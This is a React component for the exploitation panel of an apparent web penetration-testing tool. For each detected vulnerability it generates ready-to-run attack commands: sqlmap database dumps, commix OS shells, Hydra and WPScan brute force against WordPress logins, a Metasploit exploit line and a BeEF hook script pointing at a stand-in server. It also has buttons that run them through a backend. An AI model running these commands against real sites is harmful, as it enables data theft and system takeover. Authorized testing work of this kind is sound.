import React, { useState } from 'react';
import { 
  Terminal, 
  Play, 
  Loader2, 
  AlertTriangle, 
  Database, 
  Code, 
  FileText, 
  Upload, 
  Zap,
  CheckCircle,
  XCircle,
  Copy,
  ExternalLink,
  Shield,
  Bug
} from 'lucide-react';
import { ScanResult, ExploitResult } from '../App';

interface ExploitationPanelProps {
  vulnerableResults: ScanResult[];
  target: string;
  exploitResults: ExploitResult[];
  onExploit: (result: Omit<ExploitResult, 'id' | 'timestamp'>) => string;
  onUpdateExploit: (id: string, updates: Partial<ExploitResult>) => void;
}

const ExploitationPanel: React.FC<ExploitationPanelProps> = ({
  vulnerableResults,
  target,
  exploitResults,
  onExploit,
  onUpdateExploit
}) => {
  const [selectedVuln, setSelectedVuln] = useState<string | null>(null);
  const [exploitOptions, setExploitOptions] = useState<Record<string, any>>({});

  const getExploitTools = (vulnType: string) => {
    const tools: Record<string, any[]> = {
      'sql-injection': [
        {
          name: 'SQLMap',
          description: 'Automated SQL injection detection and exploitation',
          command: 'sqlmap',
          options: ['--batch', '--dbs', '--tables', '--dump'],
          severity: 'high'
        },
        {
          name: 'Manual SQL Injection',
          description: 'Custom SQL injection payloads',
          command: 'manual',
          options: ['union-select', 'boolean-blind', 'time-blind'],
          severity: 'medium'
        }
      ],
      'xss-testing': [
        {
          name: 'XSStrike',
          description: 'Advanced XSS detection and exploitation',
          command: 'xsstrike',
          options: ['--crawl', '--blind', '--skip-dom'],
          severity: 'high'
        },
        {
          name: 'BeEF Framework',
          description: 'Browser exploitation framework',
          command: 'beef',
          options: ['--hook', '--payload', '--social-engineering'],
          severity: 'critical'
        },
        {
          name: 'Manual XSS',
          description: 'Custom XSS payloads',
          command: 'manual',
          options: ['reflected', 'stored', 'dom-based'],
          severity: 'medium'
        }
      ],
      'lfi-testing': [
        {
          name: 'LFISuite',
          description: 'Local file inclusion exploitation',
          command: 'lfisuite',
          options: ['--list', '--cookie', '--data'],
          severity: 'high'
        },
        {
          name: 'Manual LFI',
          description: 'Custom LFI payloads',
          command: 'manual',
          options: ['path-traversal', 'log-poisoning', 'wrapper-abuse'],
          severity: 'medium'
        }
      ],
      'rfi-testing': [
        {
          name: 'RFI Exploitation',
          description: 'Remote file inclusion exploitation',
          command: 'manual',
          options: ['shell-upload', 'code-execution'],
          severity: 'critical'
        }
      ],
      'command-injection': [
        {
          name: 'Commix',
          description: 'Command injection exploitation',
          command: 'commix',
          options: ['--batch', '--technique=T', '--os-shell'],
          severity: 'critical'
        },
        {
          name: 'Manual Command Injection',
          description: 'Custom command injection payloads',
          command: 'manual',
          options: ['blind', 'time-based', 'output-based'],
          severity: 'high'
        }
      ],
      'file-upload': [
        {
          name: 'Web Shell Upload',
          description: 'Upload and execute web shells',
          command: 'manual',
          options: ['php-shell', 'jsp-shell', 'asp-shell'],
          severity: 'critical'
        },
        {
          name: 'Metasploit',
          description: 'File upload exploitation modules',
          command: 'msfconsole',
          options: ['web_delivery', 'php_meterpreter'],
          severity: 'critical'
        }
      ],
      'login-bruteforce': [
        {
          name: 'Hydra',
          description: 'Password brute force attack',
          command: 'hydra',
          options: ['-L users.txt', '-P passwords.txt', 'http-post-form'],
          severity: 'high'
        },
        {
          name: 'WPScan',
          description: 'WordPress specific brute force',
          command: 'wpscan',
          options: ['--passwords', '--usernames', '--throttle'],
          severity: 'medium'
        }
      ],
      'plugin-enumeration': [
        {
          name: 'WPScan',
          description: 'WordPress plugin vulnerability scanner',
          command: 'wpscan',
          options: ['--enumerate', 'vp', '--plugins-detection'],
          severity: 'medium'
        },
        {
          name: 'Exploit-DB Search',
          description: 'Search for known exploits',
          command: 'searchsploit',
          options: ['wordpress', 'plugin'],
          severity: 'high'
        }
      ]
    };
    return tools[vulnType] || [];
  };

  const generateExploitCommand = (vuln: ScanResult, tool: any, endpoint?: any) => {
    const baseUrl = target;
    
    switch (tool.command) {
      case 'sqlmap':
        if (endpoint) {
          return `sqlmap -u "${endpoint.url}" -p ${endpoint.parameter} --batch --dbs --risk=3 --level=5`;
        }
        return `sqlmap -u "${baseUrl}" --crawl=2 --batch --dbs`;
      
      case 'xsstrike':
        if (endpoint) {
          return `python3 XSStrike.py -u "${endpoint.url}" --crawl`;
        }
        return `python3 XSStrike.py -u "${baseUrl}" --crawl`;
      
      case 'lfisuite':
        if (endpoint) {
          return `python3 lfisuite.py -u "${endpoint.url}" -c 50`;
        }
        return `python3 lfisuite.py -u "${baseUrl}" -c 50`;
      
      case 'commix':
        if (endpoint) {
          return `python3 commix.py -u "${endpoint.url}" --batch --technique=T`;
        }
        return `python3 commix.py -u "${baseUrl}" --batch`;
      
      case 'hydra':
        return `hydra -L users.txt -P passwords.txt ${new URL(baseUrl).hostname} http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:ERROR"`;
      
      case 'wpscan':
        return `wpscan --url ${baseUrl} --enumerate vp --passwords passwords.txt --usernames users.txt`;
      
      case 'beef':
        return `# Start BeEF Framework and inject hook:\n<script src="http://your-beef-server:3000/hook.js"></script>`;
      
      case 'msfconsole':
        return `msfconsole -x "use exploit/multi/http/php_utility_belt; set RHOSTS ${new URL(baseUrl).hostname}; exploit"`;
      
      default:
        return `# Manual exploitation required for ${tool.name}`;
    }
  };

  const executeExploit = async (vuln: ScanResult, tool: any, endpoint?: any) => {
    const exploitId = onExploit({
      vulnerabilityId: vuln.id,
      type: vuln.type,
      tool: tool.name,
      status: 'pending'
    });

    // Update status to running
    onUpdateExploit(exploitId, { status: 'running' });
    
    try {
      // Call the backend API for exploitation
      const response = await fetch(`http://localhost:3001/api/exploit/${vuln.type}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          url: target,
          vulnerability: vuln.data,
          tool: tool.name,
          options: endpoint ? { endpoint } : {}
        })
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const exploitResults = await response.json();
      
      onUpdateExploit(exploitId, { 
        status: 'completed',
        data: exploitResults
      });
    } catch (error) {
      console.error(`Exploitation failed for ${tool.name}:`, error);
      onUpdateExploit(exploitId, { 
        status: 'error',
        error: error.message
      });
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  const getVulnIcon = (type: string) => {
    switch (type) {
      case 'sql-injection': return <Database className="h-5 w-5 text-red-400" />;
      case 'xss-testing': return <Code className="h-5 w-5 text-yellow-400" />;
      case 'lfi-testing': return <FileText className="h-5 w-5 text-orange-400" />;
      case 'rfi-testing': return <ExternalLink className="h-5 w-5 text-red-500" />;
      case 'command-injection': return <Terminal className="h-5 w-5 text-purple-400" />;
      case 'file-upload': return <Upload className="h-5 w-5 text-pink-400" />;
      case 'login-bruteforce': return <Shield className="h-5 w-5 text-blue-400" />;
      case 'plugin-enumeration': return <Bug className="h-5 w-5 text-green-400" />;
      default: return <AlertTriangle className="h-5 w-5 text-slate-400" />;
    }
  };

  const getVulnName = (type: string) => {
    const names: Record<string, string> = {
      'sql-injection': 'SQL Injection',
      'xss-testing': 'Cross-Site Scripting (XSS)',
      'lfi-testing': 'Local File Inclusion (LFI)',
      'rfi-testing': 'Remote File Inclusion (RFI)',
      'command-injection': 'Command Injection',
      'file-upload': 'File Upload Vulnerability',
      'login-bruteforce': 'Weak Authentication',
      'plugin-enumeration': 'Vulnerable Plugins'
    };
    return names[type] || type;
  };

  const getSeverityColor = (severity: string) => {
    switch (severity?.toLowerCase()) {
      case 'critical': return 'bg-red-500/20 text-red-400 border-red-500/30';
      case 'high': return 'bg-orange-500/20 text-orange-400 border-orange-500/30';
      case 'medium': return 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30';
      case 'low': return 'bg-blue-500/20 text-blue-400 border-blue-500/30';
      default: return 'bg-slate-500/20 text-slate-400 border-slate-500/30';
    }
  };

  if (vulnerableResults.length === 0) {
    return (
      <div className="bg-slate-800/50 backdrop-blur-sm border border-slate-700 rounded-2xl p-8 text-center">
        <Shield className="h-16 w-16 text-green-400 mx-auto mb-4" />
        <h3 className="text-xl font-bold text-white mb-2">No Exploitable Vulnerabilities Found</h3>
        <p className="text-slate-400">
          Run a vulnerability scan first to identify potential security issues that can be exploited.
        </p>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Warning Banner */}
      <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-4">
        <div className="flex items-start space-x-3">
          <AlertTriangle className="h-6 w-6 text-red-400 mt-1 flex-shrink-0" />
          <div>
            <h3 className="text-red-400 font-semibold mb-1">Exploitation Warning</h3>
            <p className="text-red-200 text-sm">
              The following tools and techniques are for authorized penetration testing only. 
              Ensure you have explicit written permission before proceeding with any exploitation attempts.
            </p>
          </div>
        </div>
      </div>

      {/* Vulnerability List */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {vulnerableResults.map((vuln) => (
          <div
            key={vuln.id}
            className="bg-slate-800/50 backdrop-blur-sm border border-slate-700 rounded-xl p-6"
          >
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center space-x-3">
                {getVulnIcon(vuln.type)}
                <h3 className="text-lg font-semibold text-white">
                  {getVulnName(vuln.type)}
                </h3>
              </div>
              <span className={`px-3 py-1 rounded-full text-xs border ${getSeverityColor('high')}`}>
                EXPLOITABLE
              </span>
            </div>

            {/* Vulnerable Endpoints */}
            {vuln.data?.vulnerable_endpoints && (
              <div className="mb-4">
                <h4 className="text-white font-medium mb-2">Vulnerable Endpoints:</h4>
                <div className="space-y-2">
                  {vuln.data.vulnerable_endpoints.slice(0, 2).map((endpoint: any, index: number) => (
                    <div key={index} className="p-3 bg-slate-900/50 rounded-lg">
                      <code className="text-blue-300 text-sm">{endpoint.url}</code>
                      <div className="text-slate-400 text-xs mt-1">
                        Parameter: {endpoint.parameter} | Severity: {endpoint.severity}
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Exploitation Tools */}
            <div>
              <h4 className="text-white font-medium mb-3">Available Exploitation Tools:</h4>
              <div className="space-y-3">
                {getExploitTools(vuln.type).map((tool, index) => (
                  <div key={index} className="border border-slate-600 rounded-lg p-4">
                    <div className="flex items-center justify-between mb-2">
                      <div className="flex items-center space-x-2">
                        <Terminal className="h-4 w-4 text-blue-400" />
                        <span className="text-white font-medium">{tool.name}</span>
                        <span className={`px-2 py-1 rounded text-xs border ${getSeverityColor(tool.severity)}`}>
                          {tool.severity.toUpperCase()}
                        </span>
                      </div>
                    </div>
                    
                    <p className="text-slate-300 text-sm mb-3">{tool.description}</p>
                    
                    {/* Command Examples */}
                    <div className="space-y-2">
                      {vuln.data?.vulnerable_endpoints ? (
                        vuln.data.vulnerable_endpoints.slice(0, 1).map((endpoint: any, endpointIndex: number) => (
                          <div key={endpointIndex}>
                            <div className="flex items-center justify-between mb-1">
                              <span className="text-slate-400 text-xs">Command for {endpoint.url}:</span>
                              <button
                                onClick={() => copyToClipboard(generateExploitCommand(vuln, tool, endpoint))}
                                className="text-blue-400 hover:text-blue-300 transition-colors"
                              >
                                <Copy className="h-4 w-4" />
                              </button>
                            </div>
                            <div className="bg-slate-900 rounded p-2 mb-2">
                              <code className="text-green-300 text-xs">
                                {generateExploitCommand(vuln, tool, endpoint)}
                              </code>
                            </div>
                            <button
                              onClick={() => executeExploit(vuln, tool, endpoint)}
                              className="w-full bg-red-600 hover:bg-red-700 text-white font-medium py-2 px-4 rounded transition-all duration-200 flex items-center justify-center space-x-2"
                            >
                              <Play className="h-4 w-4" />
                              <span>Execute {tool.name}</span>
                            </button>
                          </div>
                        ))
                      ) : (
                        <div>
                          <div className="flex items-center justify-between mb-1">
                            <span className="text-slate-400 text-xs">General command:</span>
                            <button
                              onClick={() => copyToClipboard(generateExploitCommand(vuln, tool))}
                              className="text-blue-400 hover:text-blue-300 transition-colors"
                            >
                              <Copy className="h-4 w-4" />
                            </button>
                          </div>
                          <div className="bg-slate-900 rounded p-2 mb-2">
                            <code className="text-green-300 text-xs">
                              {generateExploitCommand(vuln, tool)}
                            </code>
                          </div>
                          <button
                            onClick={() => executeExploit(vuln, tool)}
                            className="w-full bg-red-600 hover:bg-red-700 text-white font-medium py-2 px-4 rounded transition-all duration-200 flex items-center justify-center space-x-2"
                          >
                            <Play className="h-4 w-4" />
                            <span>Execute {tool.name}</span>
                          </button>
                        </div>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        ))}
      </div>

      {/* Exploitation Results */}
      {exploitResults.length > 0 && (
        <div className="bg-slate-800/50 backdrop-blur-sm border border-slate-700 rounded-xl p-6">
          <h3 className="text-xl font-bold text-white mb-4 flex items-center space-x-2">
            <Zap className="h-6 w-6 text-yellow-400" />
            <span>Exploitation Results</span>
          </h3>
          
          <div className="space-y-4">
            {exploitResults.map((result) => (
              <div key={result.id} className="border border-slate-600 rounded-lg p-4">
                <div className="flex items-center justify-between mb-3">
                  <div className="flex items-center space-x-2">
                    <Terminal className="h-5 w-5 text-blue-400" />
                    <span className="text-white font-medium">{result.tool}</span>
                    <span className="text-slate-400">→</span>
                    <span className="text-slate-300">{getVulnName(result.type)}</span>
                  </div>
                  {result.status === 'completed' && <CheckCircle className="h-5 w-5 text-green-400" />}
                  {result.status === 'running' && <Loader2 className="h-5 w-5 text-blue-400 animate-spin" />}
                  {result.status === 'error' && <XCircle className="h-5 w-5 text-red-400" />}
                </div>
                
                {result.status === 'completed' && result.data && (
                  <div className="bg-slate-900/50 rounded p-3">
                    <pre className="text-green-300 text-sm overflow-x-auto">
                      {JSON.stringify(result.data, null, 2)}
                    </pre>
                  </div>
                )}
                
                {result.status === 'running' && (
                  <div className="text-blue-400 text-sm">Exploitation in progress...</div>
                )}

                {result.status === 'error' && (
                  <div className="text-red-400 text-sm">Error: {result.error}</div>
                )}
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
};

export default ExploitationPanel;